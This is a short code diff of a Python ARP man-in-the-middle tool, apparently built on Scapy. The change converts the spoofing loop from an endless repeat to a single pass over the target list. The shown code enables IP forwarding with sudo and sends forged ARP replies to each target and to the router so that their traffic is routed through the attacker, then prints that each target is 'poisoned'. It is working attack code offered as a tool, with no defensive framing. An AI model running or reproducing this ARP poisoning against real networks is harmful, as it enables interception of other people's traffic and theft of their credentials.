@@ -87,14 +87,12 @@ class arp_mitm:
         print("{0}[*] Use Wireshark or a similar network analysis tool to monitor the traffic.".format(Y))
         os.popen("sudo echo '1' > {0}".format(self.ipforward_file))
         try:
-            while True:
-                for i in self.tgt_list:
-                    result = self.tgt_list[i].split('-')
-                    send(ARP(op=2, pdst=result[0], psrc=self.rtrip, hwdst=result[1]), count=1, verbose=0)
-                    send(ARP(op=2, pdst=self.rtrip, psrc=result[0], hwdst=self.rtrmac), count=1, verbose=0)
-                    time.sleep(5)
-                    print("{0}[*] Target %s with MAC Address %s poisoned".format(G) % (result[0], result[1]))
-                    continue
+            for i in self.tgt_list:
+                result = self.tgt_list[i].split('-')
+                send(ARP(op=2, pdst=result[0], psrc=self.rtrip, hwdst=result[1]), count=1, verbose=0)
+                send(ARP(op=2, pdst=self.rtrip, psrc=result[0], hwdst=self.rtrmac), count=1, verbose=0)
+                time.sleep(5)
+                print("{0}[*] Target %s with MAC Address %s poisoned".format(G) % (result[0], result[1]))
         except KeyboardInterrupt:
             print("{0}[*] ARP MITM Attack stopped by user.".format(R))
             self.stop_arp_mitm()
